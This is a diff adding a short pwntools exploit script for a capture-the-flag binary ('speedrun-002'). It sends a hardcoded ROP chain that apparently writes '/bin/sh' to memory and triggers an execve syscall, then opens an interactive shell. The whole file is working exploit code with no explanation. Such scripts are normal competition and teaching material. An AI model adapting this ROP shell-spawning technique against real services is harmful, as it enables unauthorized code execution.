@@ -1,0 +1,10 @@
+from pwn import *
+#io=remote("speedrun-001.quals2019.oooverflow.io",31337)
+io=process("./speedrun-002")
+gdb.attach(io)
+io.recv()
+payload="a"*8+p64(0x6b6020)+p64(0x00415664)+p64(0)+p64(0x00400686)+p64(0)+p64(0x004101f3)+p64(0x6b6238)+p64(0x0044be16)+p64(8)+p64(0x00474e65)+p64(0x00415664)+p64(59)+p64(0x00400686)+p64(0x6b6238)+p64(0x004101f3)+p64(0)+p64(0x0044be16)+p64(0)+p64(0x00474e65)
+io.sendline(payload)
+io.recv()
+io.sendline("/bin/sh\x00")
+io.interactive()
